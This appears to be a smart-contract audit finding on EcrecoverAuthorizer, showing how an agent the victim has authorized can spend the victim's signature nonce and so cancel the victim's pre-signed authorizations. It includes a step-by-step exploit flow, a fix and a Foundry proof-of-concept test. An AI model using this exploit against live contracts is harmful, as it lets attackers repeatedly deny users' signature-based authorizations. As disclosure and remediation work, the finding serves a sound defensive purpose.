Looking at the exact code path in `EcrecoverAuthorizer.setIsAuthorized`:

### Title
Authorized agent can increment victim's EcrecoverAuthorizer nonce without victim's consent, invalidating pending pre-signed authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that passes `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)`, meaning any agent already authorized by the victim in Midnight can sign and submit an `Authorization` struct naming the victim as `authorizer`. This permanently increments `nonce[victim]` without the victim ever signing anything, invalidating any pre-signed authorization the victim had distributed off-chain.

### Finding Description
The exact code path in `src/periphery/EcrecoverAuthorizer.sol`:

```
Line 26: require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
...
Line 33-36:
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

The nonce is incremented as part of the `require` at line 26 and is committed permanently if the full transaction succeeds. The signer check at lines 33–36 accepts either the authorizer themselves **or** any address for which `isAuthorized[authorizer][signer]` is `true` in Midnight.

**Attacker-controlled inputs:**
- `authorization.authorizer = victim`
- `authorization.authorized = victim` (or any address; the actual state change is irrelevant)
- `authorization.isAuthorized = true`
- `authorization.nonce = N` (current `nonce[victim]`)
- `authorization.deadline = block.timestamp + 1` (any valid future timestamp)
- `signature` = attacker signs the above struct with their own private key

**Exploit flow:**
1. Precondition: victim previously called `midnight.setIsAuthorized(attacker, true, victim)`, making `isAuthorized[victim][attacker] = true`.
2. Attacker constructs the `Authorization` struct above and signs it with their own key.
3. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
4. Line 25: deadline check passes.
5. Line 26: `N == nonce[victim]` passes; `nonce[victim]` increments to `N+1`.
6. Lines 28–31: digest computed; `ecrecover` returns attacker's address.
7. Line 32: attacker address is non-zero; passes.
8. Lines 33–36: `signer == authorization.authorizer` is false, but `isAuthorized[victim][attacker]` is `true`; passes.
9. Line 46–47: `midnight.setIsAuthorized(victim, true, victim)` executes — a semantically irrelevant self-authorization.
10. Transaction succeeds; `nonce[victim]` is permanently `N+1`.

Any pre-signed `Authorization` the victim had created and distributed (e.g., to a relayer or counterparty) with `nonce = N` is now permanently invalid because `InvalidNonce()` will revert on replay.

**Why existing checks fail:** The `isAuthorized` delegation was designed to let authorized agents act on behalf of the authorizer in Midnight's core market functions. Reusing the same delegation gate in `EcrecoverAuthorizer` conflates "authorized to act in the market" with "authorized to consume the authorizer's signature nonce," which are distinct trust levels. There is no check that the signer is the authorizer themselves for the purpose of nonce management. [2](#0-1) 

### Impact Explanation
A victim who has pre-signed an `Authorization` (e.g., to permit a relayer to call `take`, `repay`, `withdraw`, `liquidate`, or `claimFee` on their behalf via `EcrecoverAuthorizer`) can have that signature rendered permanently unusable. The attacker pays only one transaction's gas. The victim must re-sign and re-distribute a new authorization with the incremented nonce. The attacker can repeat this indefinitely as long as they remain authorized, creating a sustained DoS on any off-chain signature flow the victim relies on.

### Likelihood Explanation
**Precondition:** Attacker must hold `isAuthorized[victim][attacker] = true` in Midnight. This is a normal, intended protocol state — users authorize agents (relayers, bots, counterparties) routinely. The attacker does not need to be a privileged role; any authorized agent qualifies.

**Feasibility:** Single transaction, no capital required, no oracle dependency, no timing constraint beyond a valid deadline. The current nonce is publicly readable from `ecrecoverAuthorizer.nonce(victim)`.

**Repeatability:** After each successful attack, the attacker can immediately repeat with `nonce = N+1`, `N+2`, etc., as long as their authorization persists. The victim cannot revoke the attacker's Midnight authorization via `EcrecoverAuthorizer` (that would itself require a valid nonce), creating a potential deadlock if the victim relies solely on the sig-based path.

### Recommendation
Remove the `isAuthorized` delegation branch from `EcrecoverAuthorizer.setIsAuthorized`. The signer must be exactly `authorization.authorizer`:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

The purpose of `EcrecoverAuthorizer` is to let the authorizer act via an off-chain signature rather than an on-chain transaction. Delegating nonce consumption to a third party defeats this purpose and breaks the nonce-as-replay-protection invariant. If delegated signing is intentionally desired, it must be gated by a separate, explicit consent mechanism that does not consume the authorizer's nonce. [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract NonceGriefTest is BaseTest {
    function testAuthorizedAgentCanIncrementVictimNonce() public {
        // Setup: victim authorizes ecrecoverAuthorizer and attacker in Midnight
        vm.startPrank(borrower); // borrower = victim
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        midnight.setIsAuthorized(lender, true, borrower); // lender = attacker
        vm.stopPrank();

        // Victim pre-signs an authorization (nonce=0) to be submitted later
        Authorization memory victimAuth = Authorization({
            authorizer: borrower,
            authorized: address(0xBEEF),
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, victimAuth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);
        Signature memory victimSig = Signature({v: v, r: r, s: s});

        // Attacker (lender) constructs a no-op authorization signed with their own key
        Authorization memory attackAuth = Authorization({
            authorizer: borrower,  // victim as authorizer
            authorized: borrower,  // self-authorization (no-op)
            isAuthorized: true,
            nonce: 0,              // current nonce[victim]
            deadline: block.timestamp + 1
        });
        bytes32 aStructHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, attackAuth));
        bytes32 aDigest = keccak256(bytes.concat("\x19\x01", domainSep, aStructHash));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(privateKey[lender], aDigest); // attacker signs
        Signature memory attackSig = Signature({v: av, r: ar, s: as_});

        // Assert: nonce is 0 before attack
        assertEq(ecrecoverAuthorizer.nonce(borrower), 0);

        // Attacker submits — no victim involvement
        vm.prank(lender);
        ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);

        // Assert: nonce[victim] is now 1 — victim's pre-signed auth (nonce=0) is dead
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        // Assert: victim's pre-signed authorization now reverts with InvalidNonce
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(borrower)` transitions from `0` to `1` after the attacker's single transaction.
- The victim's legitimately pre-signed authorization with `nonce=0` reverts with `InvalidNonce()`.
- The attacker spent zero capital beyond gas; the victim's off-chain authorization flow is broken.
